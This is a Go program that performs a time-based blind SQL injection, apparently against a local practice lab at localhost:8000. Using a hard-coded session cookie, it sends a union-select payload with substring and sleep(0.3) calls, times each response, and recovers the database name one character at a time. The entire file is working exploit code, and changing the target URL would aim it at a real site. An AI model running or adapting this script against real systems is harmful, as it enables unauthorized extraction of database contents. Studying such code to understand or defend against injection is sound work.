package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"time"
)

var Red = "\033[31m"
var Magenta = "\033[35m"
var Green = "\033[32m"
var Yellow = "\033[33m"
var EndColor = "\033[0m"

var Strings = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~"

// var Strings = "klmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~"

func makeRequest(payload string) {

	client := &http.Client{}

	encodedPayload := url.QueryEscape(payload)
	url := "http://localhost:8000/sql-injection/error_based/1?search=" + encodedPayload

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Add("Cookie", "laravel_session=eyJpdiI6IlZGK3k5YTdnT3JTRlpMRDZJNm9jK0E9PSIsInZhbHVlIjoiMkFRUWJ4U0t4ZXFKSXJmdEZSTm9HS3N3cHBBWGdlS3NxZkcvQUJjSS8zYXVTYnRobWhLTC91cU9Td2RxWjhjZ1AxRzJpSnNvM1laWTdITFZPcm0wK1l0WVR4UVluT3U4MVpBdm02T0VTUWtNZ1VHZmFSaVRSbXRJUEtSMVh0WVUiLCJtYWMiOiI5MWUyODcwZjE3MDFjNjk4ZTI4ODRhZGY1MWVhMDVlMTE1YTUzM2NiNjk1NmZkZTllNzg3N2NiMDRjYzlmNTYxIiwidGFnIjoiIn0%3D")

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	// body, _ := io.ReadAll(resp.Body)

	// fmt.Println(string(body))
}

func handle() {
	databaseName := exploitDatabase("' or 1=1 union select 1, 2, if(substring((select database()), '{index}', 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #")
	fmt.Printf("%v[✔] Database's name found: %v\n", Green, databaseName)

}

func exploitDatabase(payload string) string {
	item := 1
	name := ""
	total_strings_verified := 0

	for {

		for _, current_value := range Strings {
			payloadFormatted := regexp.MustCompile(`\{index\}`).ReplaceAllString(payload, strconv.Itoa(item))
			payloadFormatted = regexp.MustCompile(`\{value\}`).ReplaceAllString(payloadFormatted, string(current_value))

			start := time.Now()
			makeRequest(payloadFormatted)
			final := time.Now()

			elapsed := final.Sub(start)

			// fmt.Println(payloadFormatted)

			fmt.Printf("%v Testing: %v %v\n", Red, string(current_value), EndColor)

			total_strings_verified++
			if elapsed >= 300*time.Millisecond {
				name = name + string(current_value)
				item++
				total_strings_verified = 0
				break
			}

			if total_strings_verified >= 90 {
				return name
			}

		}

	}
	return ""

}

func main() {
	handle()
}
